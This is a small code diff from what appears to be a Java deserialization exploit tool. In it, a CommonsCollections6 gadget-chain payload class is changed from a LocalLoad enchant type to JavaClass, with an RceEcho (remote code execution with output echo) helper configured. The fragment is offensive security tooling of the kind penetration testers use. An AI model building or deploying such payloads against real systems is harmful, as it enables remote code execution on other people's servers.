@@ -36,7 +36,7 @@ public class CommonsCollections6 implements ObjectPayload<Object> {
 
         SinksHelper sinksHelper = new SinksHelper();
         sinksHelper.setSink(CommonsCollections6.class.getAnnotation(Sink.class).value()[0]);
-        sinksHelper.setEnchant(EnchantType.LocalLoad);
+        sinksHelper.setEnchant(EnchantType.JavaClass);
         sinksHelper.setSave(true);
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         javaClassHelper.setJavaClassHelperType(JavaClassHelperType.RceEcho);
